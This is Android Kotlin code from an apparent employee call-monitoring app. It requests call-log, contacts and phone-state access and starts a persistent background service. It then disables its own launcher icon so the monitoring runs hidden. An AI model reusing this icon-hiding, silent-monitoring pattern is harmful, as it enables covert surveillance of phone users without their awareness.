package com.asf.callmonitoring.ui.theme.main

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.asf.callmonitoring.data.UserPreferences
import com.asf.callmonitoring.data.api.ApiService
import com.asf.callmonitoring.data.model.Usuario
import com.asf.callmonitoring.service.CallMonitoringService
import com.asf.callmonitoring.ui.theme.UserSelectionScreen
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        setContent {
            Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                PantallaPrincipal(modifier = Modifier.padding(innerPadding))
            }
        }
    }
}

// FUNCIONES AUXILIARES PARA EL MODO SERVICIO SILENCIOSO


fun ocultarIconoDelLanzador(context: Context) {
    try {
        val packageManager = context.packageManager
        val componentName = ComponentName(context, MainActivity::class.java)

        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d("DEBUG_OCULTAR", "Ícono de la aplicación deshabilitado del lanzador")
    } catch (e: Exception) {
        Log.e("DEBUG_OCULTAR", "Error al ocultar el icono: ${e.message}")
    }
}

fun abrirAjustesNotificaciones(context: Context) {
    try {
        val intent = Intent().apply {
            when {
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> {
                    action = Settings.ACTION_APP_NOTIFICATION_SETTINGS
                    putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
                }
                else -> {
                    action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                    data = Uri.parse("package:${context.packageName}")
                }
            }
        }
        context.startActivity(intent)
    } catch (e: Exception) {
        Log.e("DEBUG_NOTIF", "Error al abrir ajustes de notificación: ${e.message}")
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun PantallaPrincipal(modifier: Modifier = Modifier) {
    val context = LocalContext.current
    val activity = context as? Activity
    val prefs = remember { UserPreferences(context) }

    var usuarioConfigurado by remember { mutableStateOf(prefs.obtenerNombreDispositivo()) }
    var listaUsuarios by remember { mutableStateOf<List<Usuario>>(emptyList()) }
    var cargandoUsuarios by remember { mutableStateOf(false) }

    val permisosRequeridos = remember {
        val lista = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            lista.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        lista.toTypedArray()
    }

    var permisosConcedidos by remember {
        mutableStateOf(
            permisosRequeridos.all {
                ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
            }
        )
    }

    fun pedirIgnorarBateria() {
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(context.packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                }
                context.startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e("DEBUG_BATTERY", "Error al pedir ignorar batería: ${e.message}")
        }
    }

    val launcherPermisos = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { resultados ->
        val todos = resultados.values.all { it }
        permisosConcedidos = todos
        if (todos) {
            pedirIgnorarBateria()
        } else {
            Toast.makeText(context, "Se requieren permisos para monitorear", Toast.LENGTH_LONG).show()
        }
    }

    LaunchedEffect(Unit) {
        val usuarioGuardado = prefs.obtenerNombreDispositivo()
        usuarioConfigurado = usuarioGuardado

        if (!permisosConcedidos) {
            launcherPermisos.launch(permisosRequeridos)
        } else {
            pedirIgnorarBateria()
        }
    }

    LaunchedEffect(Unit) {
        cargandoUsuarios = true
        withContext(Dispatchers.IO) {
            try {
                // Cliente con timeout extendido para evitar cancelaciones prematuras
                val okHttpClient = okhttp3.OkHttpClient.Builder()
                    .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                    .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                    .retryOnConnectionFailure(true)
                    .build()

                val retrofit = Retrofit.Builder()
                    .baseUrl("https://api2.agrosantafe.com.mx")
                    .client(okHttpClient)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build()

                val api = retrofit.create(ApiService::class.java)
                val response = api.getUsuarios()

                if (response.isSuccessful) {
                    val data = response.body() ?: emptyList()
                    Log.d("DEBUG_SESION", "Usuarios obtenidos: ${data.size}")
                    withContext(Dispatchers.Main) {
                        listaUsuarios = data
                        cargandoUsuarios = false
                    }
                } else {
                    Log.e("DEBUG_SESION", "Error en API HTTP: ${response.code()}")
                    withContext(Dispatchers.Main) { cargandoUsuarios = false }
                }
            } catch (e: Exception) {
                Log.e("DEBUG_SESION", "Error al conectar API: ${e.javaClass.simpleName} - ${e.message}", e)
                withContext(Dispatchers.Main) { cargandoUsuarios = false }
            }
        }
    }

    if (!permisosConcedidos) {
        Column(
            modifier = modifier
                .fillMaxSize()
                .padding(24.dp),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "Permisos requeridos pendientes",
                style = MaterialTheme.typography.titleMedium,
                color = MaterialTheme.colorScheme.error,
                fontWeight = FontWeight.Bold
            )
            Spacer(modifier = Modifier.height(12.dp))
            Text(
                text = "Se necesitan permisos de llamadas y contactos para habilitar el servicio de monitoreo.",
                style = MaterialTheme.typography.bodyMedium
            )
            Spacer(modifier = Modifier.height(16.dp))
            Button(onClick = { launcherPermisos.launch(permisosRequeridos) }) {
                Text("Conceder Permisos")
            }
        }
    } else if (cargandoUsuarios) {
        Box(
            modifier = modifier.fillMaxSize(),
            contentAlignment = Alignment.Center
        ) {
            CircularProgressIndicator()
        }
    } else {
        // Interfaz de selección de vendedor
        Column(modifier = modifier.fillMaxSize()) {
            // Botón opcional previo para apagar las alertas visuales si se desea
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp, vertical = 8.dp),
                horizontalArrangement = Arrangement.End
            ) {
                TextButton(onClick = { abrirAjustesNotificaciones(context) }) {
                    Text("Ajustar Notificaciones")
                }
            }

            UserSelectionScreen(
                usuarios = listaUsuarios,
                onUserConfigured = {
                    val nuevoUsuario = prefs.obtenerNombreDispositivo()
                    Log.d("DEBUG_SESION", "Usuario activado: '$nuevoUsuario'")

                    // 1. Arranca el servicio persistente
                    CallMonitoringService.startService(context)

                    Toast.makeText(
                        context,
                        "Servicio activado en segundo plano",
                        Toast.LENGTH_LONG
                    ).show()

                    // 2. Oculta el icono del teléfono
                    ocultarIconoDelLanzador(context)

                    // 3. Cierra la aplicación de raíz
                    activity?.finishAffinity()
                }
            )
        }
    }
}